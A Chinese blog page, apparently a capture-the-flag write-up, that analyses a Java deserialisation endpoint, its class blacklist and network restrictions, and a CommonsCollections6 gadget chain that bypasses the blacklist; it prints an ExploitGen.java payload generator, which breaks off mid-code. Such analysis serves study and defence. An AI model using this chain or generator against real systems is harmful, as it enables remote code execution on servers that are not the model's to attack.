@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html 
+	lang="zh-CN">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		
+<link rel="stylesheet" href="/css/layout.css">
+
+		
+		<title> ezJava复现 -  冷鸢</title>
+		<!-- <link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css" /> -->
+		<!-- <script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script> -->
+		
+<link rel="stylesheet" href="/lib/mdui/mdui.min.css">
+
+		
+<script src="/lib/mdui/mdui.min.js"></script>
+
+		<!-- lazyload -->
+		
+<script src="/lib/lazysizes.js"></script>
+
+		<!-- smooth-scrolling -->
+		
+<script src="/lib/smooth-scrolling.js"></script>
+
+		<!-- highlight -->
+		
+<link rel="stylesheet" href="/lib/highlight/atom-one-dark.min.css">
+
+		
+<script src="/lib/highlight/highlight.min.js"></script>
+
+		<!-- 预置 kiraicon -->
+		
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css">
+
+		
+		<link
+			rel="shortcut icon"
+			href="https://img-reg-ab.imagency.cn/e/aec6cd43820929bb4ef2bb5a87b5127a.jpg"
+			type="image/png"
+		/>
+		
+<link rel="stylesheet" href="/deps/css/APlayer.min.css">
+
+		
+		
+<script src="/deps/js/APlayer.min.js"></script>
+<script src="/deps/js/Meting.min.js"></script>
+
+	<meta name="generator" content="Hexo 7.3.0"></head>
+
+	<body>
+		<div
+			class="kira-background"
+			style="background-image: url('https://img-reg-ab.imagency.cn/e/7445c1795246db19800a6d94db5085cd.png')"
+		></div>
+		<div class="kira-header">
+    <a
+        class="kira-drawer-button mdui-ripple"
+        title="导航栏"
+        onclick="document.querySelector('.kira-sidebar-modal').classList.add('show');document.querySelector('.kira-sidebar#sidebar').classList.add('show');"
+    >
+        <i class="kirafont icon-menu"></i>
+    </a>
+    <a href="/" title="冷鸢">
+        <img
+			src="https://img-reg-ab.imagency.cn/e/1d734a4a833486c5625d3f0e2fc8ff3b.jpg"
+			alt="leng yuan"
+		/>
+    </a>
+</div>
+		<div class="kira-body">
+			<div class="kira-sidebar" id="sidebar">
+	<div class="kira-avatar mdui-ripple">
+		<a target="_blank" rel="noopener" href="https://img-reg-ab.imagency.cn/e/1d734a4a833486c5625d3f0e2fc8ff3b.jpg" title="leng yuan">
+			<img
+				src="https://img-reg-ab.imagency.cn/e/1d734a4a833486c5625d3f0e2fc8ff3b.jpg"
+				alt="leng yuan"
+			/>
+		</a>
+	</div>
+	<div class="kira-count">
+		<div><span>文章</span>2</div>
+		<div><span>标签</span>0</div>
+		<div><span>分类</span>0</div>
+	</div>
+	<div class="kira-list">
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/"
+			title="回到首页"
+		>
+			<i
+				class="kirafont
+					
+						icon-home
+					"
+			></i>
+			<div class="kira-list-item-content">
+				回到首页
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/archive.html"
+			title="文章归档"
+		>
+			<i
+				class="kirafont
+					
+						icon-container
+					"
+			></i>
+			<div class="kira-list-item-content">
+				文章归档
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/about.html"
+			title="关于本人"
+		>
+			<i
+				class="kirafont
+					
+						icon-user
+					"
+			></i>
+			<div class="kira-list-item-content">
+				关于本人
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/friends.html"
+			title="我的朋友"
+		>
+			<i
+				class="kirafont
+					
+						icon-team
+					"
+			></i>
+			<div class="kira-list-item-content">
+				我的朋友
+			</div>
+		</a>
+		
+	</div>
+	<aside id="kira-sidebar">
+		
+			<div class="kira-widget-wrap">
+	<div class="kira-widget kira-social">
+		
+			<a
+				class="mdui-ripple"
+				href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=3262899260&website=www.oicqzone.com"
+				target="_blank"
+				mdui-tooltip="{content: 'QQ'}"
+				style="color: rgb(49, 174, 255); background-color: rgba(49, 174, 255, .1);"
+			>
+				<i
+					class="kirafont
+					
+						icon-QQ
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://space.bilibili.com/bili_81910861385"
+				target="_blank"
+				mdui-tooltip="{content: '哔哩哔哩'}"
+				style="color: rgb(231, 106, 141); background-color: rgba(231, 106, 141, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-bilibili
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://github.com/leng-yaun"
+				target="_blank"
+				mdui-tooltip="{content: 'GitHub'}"
+				style="color: rgb(25, 23, 23); background-color: rgba(25, 23, 23, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-github
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://gitee.com/<你的gitee id>"
+				target="_blank"
+				mdui-tooltip="{content: 'Gitee'}"
+				style="color: rgb(165, 15, 15); background-color: rgba(165, 15, 15, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-gitee
+					"
+				></i>
+			</a>
+		
+	</div>
+</div>
+
+		
+			
+		
+			
+
+		
+			
+	<div class="kira-widget-wrap">
+		<h3 class="kira-widget-title">
+			文章归档
+		</h3>
+		<div class="kira-widget">
+			<ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/">2026</a><span class="archive-list-count">2</span></li></ul>
+		</div>
+	</div>
+
+
+		
+	</aside>
+	<div class="kira-copyright">
+		&copy; 2026
+		<a href="/">leng yuan</a>
+		Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> &
+		<a href="https://github.com/ch1ny/kira-hexo/" target="_blank">Kira-Hexo</a>
+		<br />
+		
+		
+	</div>
+</div>
+<div
+	class="kira-sidebar-modal"
+	id="sidebar-modal"
+	onclick="(function(self) {
+		self.classList.remove('show');
+		document.querySelector('.kira-sidebar.show#sidebar').classList.remove('show');
+	})(this)"
+></div>
+			<div class="kira-content">
+				<div id="kira-top-header"></div>
+				<div class="kira-main-content">
+					
+<link rel="stylesheet" href="/css/kira-image.css">
+
+
+<script src="/js/kira-image.js"></script>
+
+<div class="kira-image">
+    <div class="kira-image-modal">
+        <div class="kira-image-header">
+            <div class="kira-image-counter"></div>
+            <div class="kira-image-title"></div>
+            <div class="kira-image-operation">
+                <div class="kira-image-operation-button" id="kira-image-operation-button-zoom">
+                    <i class="kirafont icon-zoom-in"></i>
+                </div>
+                <div class="kira-image-operation-button" id="kira-image-operation-button-close">
+                    <i class="kirafont icon-close"></i>
+                </div>
+            </div>
+        </div>
+        <div class="kira-image-container">
+            <div class="kira-image-prev-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-left"></i>
+                </div>
+            </div>
+            <div class="kira-image-list">
+                <div class="kira-image-prev">
+                    <img />
+                </div>
+                <div class="kira-image-now">
+                    <img />
+                </div>
+                <div class="kira-image-next">
+                    <img />
+                </div>
+            </div>
+            <div class="kira-image-next-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-right"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+	
+<link rel="stylesheet" href="/css/kira-code-copy.css">
+
+	
+<script src="/js/kira-code-copy.js"></script>
+
+
+<div class="kira-post">
+	<article>
+		
+		<div
+			class="kira-post-cover"
+			style="padding-bottom: '56.25%'"
+		>
+			<img
+				data-src="https://img-reg-ab.imagency.cn/e/7445c1795246db19800a6d94db5085cd.png"
+				data-sizes="auto"
+				alt="ezJava复现"
+				class="lazyload kira-post-cover-image disabled-kira-image"
+			/>
+			<h1>ezJava复现</h1>
+		</div>
+		
+		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
+			<a><i class="kirafont icon-calendar-fill"></i>2026年05月05日</a>
+			<a><i class="kirafont icon-edit-fill"></i>1.9k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 9 分钟</a>
+		</div>
+		<html><head></head><body><h1><span id="ezjava-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8">EzJava 反序列化漏洞分析与利用</span></h1><h2><span id="%E4%B8%80%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF">一、环境信息</span></h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>版本/说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JDK</td>
+<td>Java 1.8.0_202</td>
+</tr>
+<tr>
+<td>框架</td>
+<td>Spring Boot 2.7.18 (Spring Framework 5.3.31)</td>
+</tr>
+<tr>
+<td>关键依赖</td>
+<td><code>commons-collections:3.2.1</code></td>
+</tr>
+<tr>
+<td>内置容器</td>
+<td>Tomcat 9.0.83</td>
+</tr>
+<tr>
+<td>运行方式</td>
+<td><code>java -jar ezjava-1.0.0.jar</code></td>
+</tr>
+</tbody></table>
+<h2><span id="%E4%BA%8C%E5%BA%94%E7%94%A8%E7%BB%93%E6%9E%84">二、应用结构</span></h2><h3><span id="21-%E9%A1%B9%E7%9B%AE%E5%85%A5%E5%8F%A3--ezjavaapplicationjava">2.1 项目入口 — EzJavaApplication.java</span></h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EzJavaApplication</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        SpringApplication.run(EzJavaApplication.class, args);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p>标准的 Spring Boot 应用，无额外配置。</p>
+<h3><span id="22-%E6%BC%8F%E6%B4%9E%E7%AB%AF%E7%82%B9--hellocontrollerjava">2.2 漏洞端点 — HelloController.java</span></h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> {<br>    <span class="hljs-meta">@GetMapping({"/"})</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> {<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"hello world"</span>;<br>    }<br><br>    <span class="hljs-meta">@PostMapping({"/"})</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> <span class="hljs-type">byte</span>[] data)</span> {<br>        <span class="hljs-keyword">try</span> {<br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeObjectInputStream</span>(bais);<br>            ois.readObject();          <span class="hljs-comment">// &lt;-- 漏洞点</span><br>            ois.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">"deserialization success"</span>;<br>        } <span class="hljs-keyword">catch</span> (Exception e) {<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p><code>POST /</code> 端点接收任意二进制数据，直接进行 Java 反序列化。这是 Java Web 应用中极其危险的操作，攻击者可以发送精心构造的恶意对象链来实现远程代码执行（RCE）。</p>
+<h3><span id="23-%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD-asafeobjectinputstreamjava%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4%E5%99%A8">2.3 缓解措施 A：SafeObjectInputStream.java（黑名单过滤器）</span></h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> {<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = {<br>        <span class="hljs-string">"java.lang.Runtime"</span>,<br>        <span class="hljs-string">"java.lang.ProcessBuilder"</span>,<br>        <span class="hljs-string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<br>        <span class="hljs-string">"java.security.SignedObject"</span>,<br>        <span class="hljs-string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>,<br>        <span class="hljs-string">"javax.management.remote.rmi.RMIConnector"</span><br>    };<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)<br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) {<br>            <span class="hljs-keyword">if</span> (className.startsWith(forbiddenPackage)) {<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<br>                    <span class="hljs-string">"Unauthorized deserialization attempt"</span>, className);<br>            }<br>        }<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p><strong>作用</strong>：仅在反序列化解析类描述符时检查类名前缀。</p>
+<p><strong>致命缺陷</strong>：</p>
+<ul>
+<li><code>resolveClass()</code> 只在 ObjectInputStream 读取序列化流中的类描述符时被调用。</li>
+<li>在运行时通过 <code>Class.forName()</code> 动态获取的类**不经过 <code>resolveClass()</code>**。</li>
+<li>黑名单只有 6 个条目，<code>commons-collections</code> 的 gadget 类全都不在其中。</li>
+</ul>
+<h3><span id="24-%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD-bcustomsecuritymanagerjava%E7%BD%91%E7%BB%9C%E5%87%BA%E5%8F%A3%E9%99%90%E5%88%B6">2.4 缓解措施 B：CustomSecurityManager.java（网络出口限制）</span></h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomSecurityManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SecurityManager</span> {<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkConnect</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port, Object context)</span> {<br>        <span class="hljs-keyword">try</span> {<br>            <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> InetAddress.getByName(host);<br>            <span class="hljs-keyword">if</span> (!addr.isLoopbackAddress()) {<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>(<br>                    <span class="hljs-string">"Network access denied: "</span> + host + <span class="hljs-string">":"</span> + port);<br>            }<br>        } <span class="hljs-keyword">catch</span> (Exception e) {<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>(<br>                <span class="hljs-string">"Network access denied: "</span> + host + <span class="hljs-string">":"</span> + port);<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p><strong>作用</strong>：禁止非回环（127.0.0.1）的网络连接。</p>
+<p><strong>效果</strong>：限制外连反弹 shell，但不影响：</p>
+<ul>
+<li>本地命令执行（写文件、启动进程）</li>
+<li>回环地址（127.0.0.1）的网络通信</li>
+</ul>
+<h3><span id="25-%E4%BE%9D%E8%B5%96--commons-collections321">2.5 依赖 — commons-collections:3.2.1</span></h3><p><code>pom.xml</code> 中显式引入了 <code>commons-collections:3.2.1</code>。该版本是 Java 反序列化历史上最著名的 “gadget” 库，提供了 <code>InvokerTransformer</code>、<code>ChainedTransformer</code>、<code>LazyMap</code> 等类，可以通过反射链执行任意代码。经典攻击工具 <strong>ysoserial</strong> 最初就是基于此库开发的。</p>
+<hr>
+<h2><span id="%E4%B8%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">三、漏洞分析</span></h2><h3><span id="31-%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0">3.1 根本原因</span></h3><p>反序列化 RCE 的核心原理：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">攻击者构造恶意对象图<br>    → 序列化为字节流<br>        → 发送给目标应用<br>            → ObjectInputStream.readObject() 还原对象<br>                → 还原过程中触发某些类的 readObject / hashCode / equals / toString 方法<br>                    → 这些方法内部调用危险的反射操作<br>                        → 最终执行 Runtime.getRuntime().exec(cmd)<br></code></pre></td></tr></tbody></table></figure>
+
+<h3><span id="32-gadget-chain-%E5%88%86%E6%9E%90">3.2 Gadget Chain 分析</span></h3><p>本次利用采用 <strong>CommonsCollections6</strong> 风格的链：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HashSet.readObject()<br>    └─ HashMap.put(entry, PRESENT)<br>        └─ entry.hashCode()<br>            └─ TiedMapEntry.getValue()<br>                └─ LazyMap.get("x")<br>                    └─ ChainedTransformer.transform("x")<br>                        ├─ [0] ConstantTransformer(Class.class)<br>                        │      → 返回 Class.class （不在黑名单）<br>                        ├─ [1] InvokerTransformer("forName", {String.class}, {"java.lang.Runtime"})<br>                        │      → 反射调用 Class.forName("java.lang.Runtime")<br>                        │      → 返回 Runtime.class （运行时动态获取，绕过 resolveClass）<br>                        ├─ [2] InvokerTransformer("getMethod", ..., {"getRuntime", ...})<br>                        │      → 反射调用 Runtime.class.getMethod("getRuntime")<br>                        │      → 返回 getRuntime Method 对象<br>                        ├─ [3] InvokerTransformer("invoke", ..., {null, ...})<br>                        │      → 反射调用 method.invoke(null)<br>                        │      → 返回 Runtime 实例<br>                        └─ [4] InvokerTransformer("exec", {String[].class}, {["bash", "-c", cmd]})<br>                               → 反射调用 runtime.exec(["bash", "-c", cmd])<br>                               → 命令执行<br></code></pre></td></tr></tbody></table></figure>
+
+<h3><span id="33-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86">3.3 黑名单绕过原理</span></h3><p>黑名单检查 <code>resolveClass()</code> 的时机：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[序列化流中]                          [运行时 JVM]<br>┌──────────────────────┐            ┌──────────────────────────────┐<br>│ TC_CLASSDESC         │            │                              │<br>│   "TiedMapEntry"     │──✓ 放行   │  TiedMapEntry.toString()     │<br>│   "LazyMap"          │──✓ 放行   │    LazyMap.get("x")          │<br>│   "ChainedTransformer"│──✓ 放行  │      chain.transform("x")    │<br>│   "ConstantTransformer"│──✓ 放行 │        Class.class            │<br>│   "InvokerTransformer"│──✓ 放行  │          .forName(            │<br>│   "Class"            │──✓ 放行   │            "java.lang.Runtime")│<br>│                      │            │             ↑                │<br>│  java.lang.Runtime   │──✗ 永远   │      只在此处，反射调用       │<br>│  (从未出现在流中!)    │   不出现   │      不经过 resolveClass     │<br>└──────────────────────┘            └──────────────────────────────┘<br></code></pre></td></tr></tbody></table></figure>
+
+<p><strong>关键点</strong>：</p>
+<ol>
+<li>链中用 <code>ConstantTransformer(Class.class)</code> 取代 <code>ConstantTransformer(Runtime.class)</code></li>
+<li><code>Class.class</code> 不在黑名单，顺利通过序列化</li>
+<li><code>Runtime.class</code> 从未出现在序列化流中</li>
+<li>只在运行时通过 <code>Class.forName("java.lang.Runtime")</code> 反射获取 → 不触发 <code>resolveClass()</code></li>
+</ol>
+<h3><span id="34-%E4%B8%BA%E4%BD%95%E7%94%A8-hashset-%E8%80%8C%E9%9D%9E-badattributevalueexpexception">3.4 为何用 HashSet 而非 BadAttributeValueExpException</span></h3><p>Java 8u202 中，<code>javax.management.BadAttributeValueExpException.readObject()</code> 已被修复，不再调用 <code>val</code> 字段的 <code>toString()</code> 方法。因此改用 <code>HashSet</code> 作为触发入口（即 CommonsCollections6 链）：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// HashSet.readObject() 反序列化时会重建内部 HashMap：</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> ... {<br>    s.defaultReadObject();<br>    map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) {<br>        <span class="hljs-type">E</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (E) s.readObject();<br>        map.put(e, PRESENT);  <span class="hljs-comment">// put 内部调用 e.hashCode()</span><br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+
+<p><code>map.put()</code> → <code>entry.hashCode()</code> → <code>TiedMapEntry.getValue()</code> → <code>LazyMap.get()</code> → 链触发。</p>
+<hr>
+<h2><span id="%E5%9B%9B%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B">四、利用过程</span></h2><h3><span id="41-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">4.1 环境准备</span></h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 从 fat JAR 中提取 commons-collections（gadget 依赖）</span><br>jar xf ezjava-1.0.0.jar BOOT-INF/lib/commons-collections-3.2.1.jar<br></code></pre></td></tr></tbody></table></figure>
+
+<h3><span id="42-payload-%E7%94%9F%E6%88%90%E5%99%A8--exploitgenjava">4.2 Payload 生成器 — ExploitGen.java</span></h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExploitGen</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> args.length &gt; <span class="hljs-number">0</span> ? args[<span class="hljs-number">0</span>] : <span class="hljs-string">"whoami &gt; /tmp/pwned"</span>;<br><br>        Transformer[] realChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]{<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Class.class),                    <span class="hljs-comment">// 1</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"forName"</span>,                        <span class="hljs-comment">// 2</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class},<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"java.lang.Runtime"</span>}),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"getMethod"</span>,                      <span class="hljs-comment">// 3</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String.class, Class[].class},<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]}),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"invoke"</span>,                         <span class="hljs-comment">// 4</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Object.class, Object[].class},<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]}),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">"exec"</span>,                           <span class="hljs-comment">// 5</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{String[].class},<br>                <span class="hljs-keyword">new</span> <span 